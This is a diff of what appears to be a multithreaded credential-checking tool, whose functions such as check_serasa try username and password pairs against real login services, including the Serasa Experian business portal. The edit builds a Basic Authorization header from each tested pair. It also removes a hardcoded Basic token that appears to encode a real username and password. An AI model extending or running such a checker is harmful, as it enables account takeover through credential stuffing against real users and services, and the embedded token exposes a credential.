@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import requests, sys, os, hashlib, threading, time, random, ssl
+import requests, sys, os, hashlib, threading, time, random, ssl, base64
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from bs4 import BeautifulSoup
 from requests.adapters import HTTPAdapter
@@ -335,6 +335,7 @@ def check_checkonn(user, pwd):
     return not is_die and r.status_code == 200, ""
 
 def check_serasa(user, pwd):
+    basic = base64.b64encode(f"{user}:{pwd}".encode()).decode()
     s = requests.Session()
     s.mount('https://', _LegacyTLSAdapter())
     r = s.post(
@@ -342,7 +343,7 @@ def check_serasa(user, pwd):
         headers={
             'Accept': 'application/json, text/plain, */*',
             'Accept-Language': 'pt-BR,pt;q=0.9',
-            'Authorization': 'Basic NDA5NDEzNDQ6TmVxQDE3NTA=',
+            'Authorization': f'Basic {basic}',
             'Content-Type': 'application/json',
             'Origin': 'https://empresas.serasaexperian.com.br',
             'Referer': 'https://empresas.serasaexperian.com.br/',
